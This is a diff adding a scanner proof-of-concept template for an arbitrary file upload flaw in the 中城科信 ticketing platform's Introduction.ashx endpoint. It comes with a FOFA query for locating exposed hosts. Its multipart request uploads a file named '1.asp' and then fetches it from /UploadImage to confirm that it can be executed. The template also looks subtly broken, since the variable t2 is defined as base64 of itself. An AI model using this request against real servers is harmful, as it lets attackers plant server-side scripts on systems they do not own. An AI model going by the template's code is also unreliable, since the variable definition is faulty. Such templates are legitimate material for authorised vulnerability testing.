@@ -1,0 +1,47 @@
+id: poc-yaml-zckx-introduction-ashx-anyfile-upload
+info:
+  name: 中城科信票务管理平台 Introduction.ashx 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 中城科信票务管理平台
+  fofa: body="SystemManager/SoftwareLicense.htm"
+variables:
+  t1: random_str(5)
+  t2: base64(t2)
+requests:
+- method: POST
+  path: /SystemManager/Introduction.ashx
+  headers:
+    Content-Type: multipart/form-data; boundary=--------------------------354575237365372692397370
+  data: '----------------------------354575237365372692397370
+
+    Content-Disposition: form-data; name="file"; filename="1.txt"
+
+    Content-Type: image/jpeg
+
+
+    {{.t2}}
+
+    ----------------------------354575237365372692397370
+
+    Content-Disposition: form-data; name="fileName"
+
+
+    1.asp
+
+    ----------------------------354575237365372692397370
+
+    Content-Disposition: form-data; name="Method"
+
+
+    UpdateUploadLinkPic
+
+    ----------------------------354575237365372692397370'
+  expression: status_code == 200 && contains(body,"UploadImage")
+  output:
+  - regex_match(body,"(?P<file>[0-9a-zA-Z_]+).asp")
+- method: GET
+  path: /UploadImage/{{.file}}.asp
+  expression: status_code == 200 && contains(body,t2) && !contains(body,"<")
+transport: http
